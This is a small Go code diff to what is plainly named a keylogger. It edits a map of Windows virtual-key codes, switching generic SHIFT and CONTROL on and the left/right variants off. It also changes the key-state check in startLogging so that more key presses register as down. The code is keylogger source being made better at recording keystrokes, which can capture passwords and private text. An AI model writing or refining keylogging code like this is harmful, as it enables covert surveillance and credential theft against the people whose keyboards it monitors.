@@ -16,8 +16,8 @@ var codes = map[int]string{
 	0x09: "TAB",
 	0x0C: "CLEAR",
 	0x0D: "ENTER",
-	//0x10: "SHIFT",
-	//0x11: "CONTROL",
+	0x10: "SHIFT",
+	0x11: "CONTROL",
 	0x12: "ALT",
 	0x13: "PAUSE",
 	0x14: "CAPSLOCK",
@@ -120,10 +120,10 @@ var codes = map[int]string{
 	0x87: "F24",
 	0x90: "NUMLOCK",
 	0x91: "SCROLLLOCK",
-	0xA0: "LSHIFT",
-	0xA1: "RSHIFT",
-	0xA2: "LCONTROL",
-	0xA3: "RCONTROL",
+	// 0xA0: "LSHIFT",
+	// 0xA1: "RSHIFT",
+	// 0xA2: "LCONTROL",
+	// 0xA3: "RCONTROL",
 	0xA4: "LMENU",
 	0xA5: "RMENU",
 	0xAD: "MUTE",
@@ -181,7 +181,7 @@ func (k *keylogger) startLogging(duration int) {
 			}
 
 			val, _, _ := getState.Call(uintptr(keycode))
-			isDown := (val == 32769)
+			isDown := (val == 32768) || (val == 32769)
 			currentKeys = append(currentKeys, key{name: codes[keycode], down: isDown})
 		}
 
